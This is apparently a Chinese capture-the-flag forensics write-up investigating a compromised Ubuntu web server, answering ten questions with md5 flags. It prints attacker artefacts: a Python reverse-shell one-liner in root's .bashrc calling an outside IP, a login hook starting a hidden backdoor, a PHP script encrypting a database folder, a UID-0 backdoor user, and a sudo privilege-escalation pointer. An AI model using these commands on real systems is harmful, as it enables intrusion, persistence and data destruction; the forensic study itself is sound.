## 1

攻击者通过什么密码成功登录了网站的后台？提交密码字符串的小写md5值，

根目录有一个流量包

![image-20241208215647959](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241208215647959.png)

302跳转成功登录，密码就是`Aa12345^`

## 2

攻击者在哪个PHP页面中成功上传了后门文件？例如upload.php页面，上传字符串"upload.php"的小写md5值，

![image-20241208215802448](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241208215802448.png)

`pluginmgr.php`文件

```
flag{b05c0be368ffa72e6cb2df7e1e1b27be}
```

## 3

找到攻击者上传的webshell文件，提交该文件的小写md5值，

![image-20241208220451678](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241208220451678.png)

```shell
root@ubuntu18:/var/www# md5sum /var/www/html/plugins/cpg.php
a097b773ced57bb7d51c6719fe8fe5f5  /var/www/html/plugins/cpg.php
```

```
flag{a097b773ced57bb7d51c6719fe8fe5f5}
```

## 4

攻击者后续又下载了一个可执行的后门程序，提交该文件的小写md5值，

![image-20241208220608217](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241208220608217.png)

```shell
root@ubuntu18:/var/www/html/plugins# cd '.       '
root@ubuntu18:/var/www/html/plugins/.       # ls -lh
total 4.0K
-rwxrwxrwx 1 www-data www-data 250 Nov 11 13:41 is.world
root@ubuntu18:/var/www/html/plugins/.       # md5sum is.world
ee279c39bf3dcb225093bdbafeb9a439  is.world
```

## 5

攻击者创建了后门用户的名称是？例如attack恶意用户，上传字符串"attack"的小写md5值，

```shell
root@ubuntu18:/var/log# grep -n -H -a -i "useradd" ./auth.log 
./auth.log:1:Oct  8 03:05:55 ubuntu18 useradd[1053]: new group: name=ubuntu18, GID=1000
./auth.log:2:Oct  8 03:05:55 ubuntu18 useradd[1053]: new user: name=ubuntu18, UID=1000, GID=1000, home=/home/ubuntu18, shell=/bin/bash
./auth.log:3:Oct  8 03:05:55 ubuntu18 useradd[1053]: add 'ubuntu18' to group 'adm'
./auth.log:4:Oct  8 03:05:55 ubuntu18 useradd[1053]: add 'ubuntu18' to group 'cdrom'
./auth.log:5:Oct  8 03:05:55 ubuntu18 useradd[1053]: add 'ubuntu18' to group 'sudo'
./auth.log:6:Oct  8 03:05:55 ubuntu18 useradd[1053]: add 'ubuntu18' to group 'dip'
./auth.log:7:Oct  8 03:05:55 ubuntu18 useradd[1053]: add 'ubuntu18' to group 'plugdev'
./auth.log:8:Oct  8 03:05:55 ubuntu18 useradd[1053]: add 'ubuntu18' to group 'lxd'
./auth.log:9:Oct  8 03:05:55 ubuntu18 useradd[1053]: add 'ubuntu18' to shadow group 'adm'
./auth.log:10:Oct  8 03:05:55 ubuntu18 useradd[1053]: add 'ubuntu18' to shadow group 'cdrom'
./auth.log:11:Oct  8 03:05:55 ubuntu18 useradd[1053]: add 'ubuntu18' to shadow group 'sudo'
./auth.log:12:Oct  8 03:05:55 ubuntu18 useradd[1053]: add 'ubuntu18' to shadow group 'dip'
./auth.log:13:Oct  8 03:05:55 ubuntu18 useradd[1053]: add 'ubuntu18' to shadow group 'plugdev'
./auth.log:14:Oct  8 03:05:55 ubuntu18 useradd[1053]: add 'ubuntu18' to shadow group 'lxd'
./auth.log:135:Apr 18 03:23:01 ubuntu18 useradd[1632]: new user: name=mysql, UID=111, GID=116, home=/nonexistent, shell=/bin/false
./auth.log:182:Nov 18 23:24:19 ubuntu18 useradd[4196]: new user: name=knowledgegraphd, UID=0, GID=0, home=/home/knowledgegraphd, shell=/bin/bash
./auth.log:183:Nov 18 23:24:19 ubuntu18 useradd[4196]: add 'knowledgegraphd' to group 'root'
./auth.log:184:Nov 18 23:24:19 ubuntu18 useradd[4196]: add 'knowledgegraphd' to shadow group 'root'
```

`knowledgegraphd`用户加入root组，可疑用户

或者查看passwd文件，观察uid为0的用户

```
cat /etc/passwd | awk -F: '$3==0{print $1}'
```

## 6

攻击者创建了一个持久化的配置项，导致任意用户登录就会触发后门的连接。提交该配置项对应配置文件的小写md5值，

`/etc/profile` 是Linux系统中一个重要的配置文件，它属于系统的全局环境配置文件。这个文件在每次用户登录时被执行，用于配置系统的全局环境变量和启动脚本。

```shell
root@ubuntu18:/etc/init.d# cat /etc/profile

/var/www/html/plugins/".       "/is.world &

root@ubuntu18:/var/lib/mysql# md5sum /etc/profile
65bf3e4a9ac90d75ec28be0317775618  /etc/profile
```

## 7

攻击者创建了一个持久化的配置项，导致只有root用户登录才会触发后门的连接。提交该配置项对应配置文件的小写md5值，

```shell
root@ubuntu18:/root# cat .bashrc
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("124.221.70.199",9919));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' &
root@ubuntu18:/root# md5sum .bashrc
4acc9c465eeeb139c194893ec0a8bcbc  .bashrc=
```

## 8

攻击者加密了哪个数据库？提交数据库的文件夹名，例如user数据库对应存放位置为user文件夹，上传字符串"user"的小写md5值，

查看/var/lib/mysql文件夹，发现 clockup.php 文件

```php
<?php
$currentDate = date("Y-m-d");
$key = md5($currentDate);
$iv = substr(hash('sha256', "DeepMountainsGD"), 0, 16);
$filePath = "/var/lib/mysql/JPMorgan@0020Chase";
$files = scandir($filePath);
foreach ($files as $file) {
    if ($file != "." && $file != "..") {
        $fullPath = $filePath . '/' . $file;
        $content = file_get_contents($fullPath);
        $encryptedContent = openssl_encrypt($content, 'aes-256-cbc', $key, 0, $iv);
        file_put_contents($fullPath, $encryptedContent);
    }
}
?>
```

JPMorgan@0020Chase文件夹被加密

## 9

解密数据库，提交Harper用户对应Areer的值。提交Areer值的小写md5值，

```shell
root@ubuntu18:/var/lib/mysql/JPMorgan@0020Chase# php -r 'echo date("Y-m-d");'
2024-04-30
root@ubuntu18:/var/lib/mysql/JPMorgan@0020Chase# php -r 'echo md5(date("Y-m-d"));'
1342d69a84b3aa4ae4f9c7c359417e80
root@ubuntu18:/var/lib/mysql/JPMorgan@0020Chase# php -r 'echo substr(hash('sha256', "DeepMountainsGD"), 0, 16);'
c8203eb05fa13ebf
```

解密脚本

```php
<?php
$currentDate = date("Y-m-d");
$key = md5('2023-11-18');
$iv = substr(hash('sha256', "DeepMountainsGD"), 0, 16);
$filePath = "JPMorgan@0020Chase";
$files = scandir($filePath);
foreach ($files as $file) {
    if ($file != "." && $file != "..") {
        $fullPath = $filePath . '/' . $file;
        $content = file_get_contents($fullPath);
        $decryptedContent = openssl_decrypt($content, 'aes-256-cbc', $key, 0, $iv);
        file_put_contents($fullPath, $decryptedContent);
    }
}
?>
```

成功解密数据库之后，找到数据库的密码

```php
$CONFIG['dbtype'] =	  'pdo:mysql';			// Your database type
$CONFIG['dbserver'] =	  'localhost';			// Your database server
$CONFIG['dbuser'] =	  'root';			// Your database username
$CONFIG['dbpass'] =	  'mysql123';			// Your database password
$CONFIG['dbname'] =	  'mirage';			// Your database name

// DATABASE TABLE NAMES PREFIX
$CONFIG['TABLE_PREFIX'] =		   'cpg16x_';
```

```
mysql> SELECT * FROM UserIdentity WHERE User = 'Harper';
+------+--------+-------+
| No   | User   | Areer |
+------+--------+-------+
| 14   | Harper | Chef  |
+------+--------+-------+
```

```
Chef
```

## 10

因为什么文件中的漏洞配置，导致了攻击者成功执行命令并提权。提交该文件的小写md5值，

sudoers文件配置错误

```shell
root    ALL=(ALL:ALL) ALL
www-data ALL=(root) NOPASSWD: /bin/systemctl status apache2.service
```

```shell
root@ubuntu18:/root# md5sum /etc/sudoers
6585817513b0ea96707ebb0d04d6aeff  /etc/sudoers
```

提权方法

https://gtfobins.github.io/gtfobins/systemctl/#sudo